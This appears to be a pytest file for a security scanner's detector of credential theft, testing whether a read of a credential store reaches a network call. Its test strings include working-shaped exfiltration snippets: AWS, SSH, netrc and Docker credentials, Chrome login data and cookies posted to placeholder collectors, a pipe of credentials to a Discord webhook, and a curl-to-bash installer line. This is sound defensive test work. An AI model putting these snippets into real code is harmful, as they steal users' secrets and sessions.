"""A credential store read and a network call are theft only when one reaches the other."""

from __future__ import annotations

import textwrap

import pytest

from cordon_scanner.detect.code.store_flow import StoreFlow


class FlowKit:
    @staticmethod
    def lines_of(text: str, *needles: str) -> list[int]:
        return [
            i for i, line in enumerate(text.split("\n"), start=1) if any(n in line for n in needles)
        ]

    @staticmethod
    def flows(text: str, store: str, egress: str) -> bool:
        return StoreFlow.reaches(
            text, FlowKit.lines_of(text, store), FlowKit.lines_of(text, egress)
        )


class TestAFlow:
    def test_python_through_two_names(self):
        text = (
            "import os, requests\n"
            "p = os.path.expanduser('~/.aws/credentials')\n"
            "\n"
            "body = open(p).read()\n"
            "payload = {'k': body}\n"
            "\n"
            "requests.post('https://example.invalid', json=payload)\n"
        )
        assert FlowKit.flows(text, ".aws/credentials", "requests.post")

    def test_shell_command_substitution(self):
        text = (
            'creds=$(cat ~/.docker/config.json)\n\n\n\ncurl -d "$creds" https://example.invalid\n'
        )
        assert FlowKit.flows(text, ".docker/config.json", "curl")

    def test_a_function_that_returns_the_store(self):
        text = (
            "function load() {\n"
            "  return fs.readFileSync(home + '/.npmrc', 'utf8');\n"
            "}\n"
            "\n"
            "\n"
            "fetch(url, { method: 'POST', body: load() });\n"
        )
        assert FlowKit.flows(text, ".npmrc", "fetch(")

    def test_a_call_on_the_same_line(self):
        text = "x = 1\nrequests.post(u, files={'f': open(os.path.expanduser('~/.netrc'))})\n"
        assert FlowKit.flows(text, ".netrc", "requests.post")

    def test_through_a_copy(self):
        text = (
            "src = Path.home() / '.config' / 'Login Data'\n"
            "shutil.copy(src, staged)\n"
            "rows = sqlite3.connect(staged).execute(q)\n"
            "urllib.request.urlopen(u, str(list(rows)).encode())\n"
        )
        assert FlowKit.flows(text, "Login Data", "urlopen")

    def test_through_a_collection_and_a_file(self):
        text = (
            "found = []\n"
            "for row in sqlite3.connect(Path.home() / 'Login Data').execute(q):\n"
            "    found.append(row)\n"
            "with open('dump.txt', 'w') as out:\n"
            "    out.write(str(found))\n"
            "\n\n\n"
            "requests.post(hook, files={'f': open('dump.txt', 'rb')})\n"
        )
        assert FlowKit.flows(text, "Login Data", "requests.post")

    def test_arguments_on_the_lines_after_the_call(self):
        text = "data = open(KEYCHAIN).read()\n\n\nrequests.post(\n    url,\n    data=data,\n)\n"
        assert FlowKit.flows(text, "KEYCHAIN).read", "requests.post")


class TestNoFlow:
    def test_an_installer_far_from_a_config_read(self):
        text = (
            "host=$(grep Host ~/.ssh/config | head -1)\n"
            'echo "using $host"\n'
            "\n"
            "\n"
            "curl -fsSL https://example.invalid/install.sh | bash\n"
        )
        assert not FlowKit.flows(text, ".ssh/config", "curl")

    def test_nothing_named(self):
        text = "open('/root/.aws/credentials')\n\n\n\nurllib.request.urlopen(classifiers_url)\n"
        assert not FlowKit.flows(text, ".aws/credentials", "urlopen")


class TestTheGrade:
    """Where nothing read reaches the call, the finding is recorded below the gate -- unless
    the file names a channel nobody sends their own keys to, or runs on its own."""

    STORE_THEN_INSTALLER = (
        "import os, subprocess\n"
        "HOSTS = os.path.expanduser('~/.aws/credentials')\n"
        "print(open(HOSTS).read().count(chr(10)))\n" + "\n" * 20 + "import urllib.request\n"
        "urllib.request.urlretrieve('https://example.invalid/tool.tar.gz', 'tool.tar.gz')\n"
    )

    @staticmethod
    def grade(tmp_path, text: str, name: str = "app/sync.py"):
        from cordon_scanner import Scanner
        from cordon_scanner.foundation.config.settings import Config

        target = tmp_path / name
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(text, encoding="utf-8")
        found = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path).findings
        return [f.severity for f in found if f.rule_id == "SUSPECT.EXFIL.CREDENTIAL_STORE.001"]

    def test_no_flow_is_recorded_below_the_gate(self, tmp_path):
        from cordon_scanner.foundation.models import Severity

        grades = self.grade(tmp_path, self.STORE_THEN_INSTALLER)
        assert grades
        assert all(g <= Severity.MEDIUM for g in grades)

    def test_a_chat_bot_beside_the_store_keeps_it(self, tmp_path):
        from cordon_scanner.foundation.models import Severity

        grades = self.grade(tmp_path, "import discord\n" + self.STORE_THEN_INSTALLER)
        assert any(g >= Severity.HIGH for g in grades)


class TestAnImportedClient:
    def test_the_call_of_an_imported_client_is_where_the_request_is(self):
        text = (
            'import fetch from "node-fetch";\n'
            "\n" * 6 + 'const keyDir = path.join(os.homedir(), ".ssh");\n'
            "const body = fs.readFileSync(path.join(keyDir, 'id_rsa'));\n"
            "\n" * 4 + "await fetch(url, { method: 'POST', body });\n"
        )
        assert FlowKit.flows(text, ".ssh", "node-fetch")


# In Python, by value. In Python, what a credential store read yields is followed by value, scope by scope.
#
# `StoreFlow`'s textual join seeded on every word of the store line, the words inside its strings
# and comments included, and grew file-wide through any line that mentioned one. It ended at 88 to
# 1,123 names per file and joined a store read to a call in an unrelated function on all 18 benign
# PyPI units it blocked (reviews/pypi-98/17-EXFIL-SCANNER-ERRORS.md §1). Python is now answered on
# `ScopedTaint`. Theft by value still flows: a cookie jar into a request, a helper's return, a copy
# of the store, a file written and read back. A parse error keeps the textual answer.


class PythonFlowKit:
    """Helpers for test_store_flow_python.py."""

    @staticmethod
    def lines_of(text: str, needle: str) -> list[int]:
        return [i for i, line in enumerate(text.split("\n"), start=1) if needle in line]

    @staticmethod
    def flows(source: str, store: str, egress: str) -> bool:
        text = textwrap.dedent(source)
        return StoreFlow.reaches(
            text,
            PythonFlowKit.lines_of(text, store),
            PythonFlowKit.lines_of(text, egress),
            language="python",
        )


NO_FLOW = {
    "a store read and a request in two functions sharing a name": (
        """
        import os, requests
        def key_size():
            with open(os.path.expanduser("~/.ssh/id_rsa")) as f:  # STORE
                data = f.read()
            return len(data) > 0
        def status(url):
            data = {"ping": 1}
            return requests.post(url, json=data, timeout=5)  # EGRESS
        """
    ),
    "the words of a command string on the store line": (
        """
        import subprocess, requests
        def wifi_password(ssid):
            out = subprocess.run(  # STORE
                ["security", "find-generic-password", "-wa", ssid], capture_output=True, text=True
            )
            print(out.stdout)
        def public_ip(find, generic, password):
            return requests.get("https://api.ipify.org", params={"f": find}).text  # EGRESS
        """
    ),
    "prose on the store line": (
        """
        import requests
        HELP = "Configure AWS credentials in ~/.aws/credentials or the environment"  # STORE
        def check(service):
            response = requests.get("https://status.example.org/" + service, timeout=1)  # EGRESS
            return response.ok
        """
    ),
}

FLOW = {
    "a browser cookie jar handed to a request": (
        """
        import browser_cookie3  # STORE
        import requests
        def billing(url):
            jar = browser_cookie3.chrome(domain_name="example.org")
            return requests.get(url, cookies=jar)  # EGRESS
        """
    ),
    "a helper returning the cookies, posted": (
        """
        import json, requests
        from pycookiecheat import chrome_cookies  # STORE
        def cookies():
            return chrome_cookies("https://example.org")
        requests.post("https://collector.example/x", data=json.dumps(cookies()))  # EGRESS
        """
    ),
    "the store copied, read and posted": (
        """
        import shutil, sqlite3, requests
        from pathlib import Path
        src = Path.home() / ".config" / "google-chrome" / "Default" / "Login Data"  # STORE
        def steal(staged):
            shutil.copy(src, staged)
            rows = sqlite3.connect(staged).execute("select * from logins").fetchall()
            requests.post("https://collector.example/x", json=rows)  # EGRESS
        """
    ),
    "the store written to a file and read back into a request": (
        """
        import os, requests
        def run():
            data = open(os.path.expanduser("~/.aws/credentials")).read()  # STORE
            with open("/tmp/c.txt", "w") as f:
                f.write(data)
            requests.post("https://collector.example/x", files={"f": open("/tmp/c.txt", "rb")})  # EGRESS
        """
    ),
    "the store read into a collection that is sent": (
        """
        import os, requests
        found = []
        def collect():
            for name in ("id_rsa", "id_ed25519"):
                with open(os.path.join(os.path.expanduser("~/.ssh"), name)) as f:  # STORE
                    found.append(f.read())
        def send():
            requests.post("https://collector.example/x", json={"keys": found})  # EGRESS
        """
    ),
    "the store read on the request's own line": (
        """
        import os, requests
        requests.post("https://collector.example/x", files={"f": open(os.path.expanduser("~/.netrc"))})  # STORE # EGRESS
        """
    ),
}


class TestPythonByValue:
    @pytest.mark.parametrize("name", sorted(NO_FLOW))
    def test_no_value_of_the_store_reaches_the_call(self, name: str) -> None:
        assert not PythonFlowKit.flows(NO_FLOW[name], "# STORE", "# EGRESS"), name

    @pytest.mark.parametrize("name", sorted(FLOW))
    def test_the_store_s_value_reaches_the_call(self, name: str) -> None:
        assert PythonFlowKit.flows(FLOW[name], "# STORE", "# EGRESS"), name


class TestFallsBackToText:
    def test_a_file_that_does_not_parse_keeps_the_textual_answer(self) -> None:
        text = "creds = open('/root/.netrc').read(\nrequests.post(u, data=creds)\n"
        assert StoreFlow.reaches(text, [1], [2], language="python") == StoreFlow.reaches(
            text, [1], [2]
        )

    def test_other_languages_are_unchanged(self) -> None:
        text = (
            'creds=$(cat ~/.docker/config.json)\n\n\n\ncurl -d "$creds" https://example.invalid\n'
        )
        assert StoreFlow.reaches(text, [1], [5], language="shell")


class TestTextInAParsedFile:
    """A store "read" that is only text inside a string, or an egress line that calls nothing, is not
    a read or a send where the tree parses (reviews/pypi-98/20, shape A): a security tool's pattern
    table, a help text naming `~/.aws/credentials`. An f-string's expressions are code."""

    PATTERNS = (
        "import re\n"
        "RULES = '''\n"
        "reads ~/.aws/credentials then posts it\n"
        "requests.post(url, data=creds)\n"
        "'''\n"
        "def scan(text):\n"
        "    return re.search(RULES, text)\n"
    )

    def test_a_store_named_in_a_multi_line_string_is_not_a_read(self) -> None:
        assert not PythonFlowKit.flows(self.PATTERNS, ".aws/credentials", "requests.post")

    def test_an_egress_line_that_calls_nothing_is_not_a_send(self) -> None:
        text = "creds = open('/root/.netrc').read()\nURL = 'https://example.invalid/upload'\n"
        assert not StoreFlow.reaches(text, [1], [2], language="python")

    def test_a_store_opened_and_posted_still_reaches(self) -> None:
        text = (
            "import os, requests\n"
            "def go():\n"
            "    creds = open(os.path.expanduser('~/.aws/credentials')).read()\n"
            "    requests.post('https://example.invalid/', data=creds)\n"
        )
        assert PythonFlowKit.flows(text, ".aws/credentials", "requests.post")

    def test_a_store_path_in_a_multi_line_f_string_that_is_opened_still_reaches(self) -> None:
        text = (
            "import os, requests\n"
            "def go(home):\n"
            "    path = f'''{home}\n"
            "/.aws/credentials{os.sep}'''\n"
            "    creds = open(path).read()\n"
            "    requests.post('https://example.invalid/', data=creds)\n"
        )
        assert StoreFlow.reaches(text, [4], [6], language="python")


class TestATemplateIsNotCode:
    """Templates and markup are not read as code for this rule (reviews/pypi-98/20, shape C): a
    store's name and a request in an HTML or Jinja template are text at scan time, even where the
    template renders a script run later. A shell script, a Makefile, a Dockerfile or a CI step keep
    their reading."""

    SHELL = (
        "#!/bin/sh\ncat ~/.aws/credentials | curl -s -d @- https://discord.com/api/webhooks/1/x\n"
    )

    def test_an_html_template_is_recorded_below_the_gate(self, tmp_path):
        from cordon_scanner.foundation.models import Severity

        page = "<html><body><pre>\n" + self.SHELL + "</pre></body></html>\n"
        grades = TestTheGrade.grade(tmp_path, page, "app/templates/index.html")
        assert all(g <= Severity.MEDIUM for g in grades), grades

    def test_a_jinja_template_is_recorded_below_the_gate(self, tmp_path):
        from cordon_scanner.foundation.models import Severity

        grades = TestTheGrade.grade(tmp_path, self.SHELL, "app/templates/boot.sh.j2")
        assert all(g <= Severity.MEDIUM for g in grades), grades

    def test_a_shell_script_keeps_its_reading(self, tmp_path):
        """Reported as it is today (the hand-run provisioning ceiling), not lowered as a template."""
        grades = TestTheGrade.grade(tmp_path, self.SHELL, "app/boot.sh")
        assert grades

    @pytest.mark.parametrize(
        "path",
        [
            "app/templates/index.html",
            "x/page.htm",
            "t/boot.sh.j2",
            "t/a.jinja",
            "t/a.jinja2",
            "t/a.tmpl",
            "t/a.mustache",
            "t/a.hbs",
        ],
    )
    def test_templates_and_markup(self, path: str) -> None:
        from cordon_scanner.detect.code.capability.legitimate_use import LegitimateUse

        assert LegitimateUse.is_template_or_markup(path)

    @pytest.mark.parametrize(
        "path",
        [
            ".github/workflows/ci.yml",
            "app/boot.sh",
            "Makefile",
            "Dockerfile",
            "a.ps1",
            "a.bat",
            "app/sync.py",
            "x.tar.gz!pkg/setup.py",
        ],
    )
    def test_what_runs_is_not_a_template(self, path: str) -> None:
        from cordon_scanner.detect.code.capability.legitimate_use import LegitimateUse

        assert not LegitimateUse.is_template_or_markup(path)
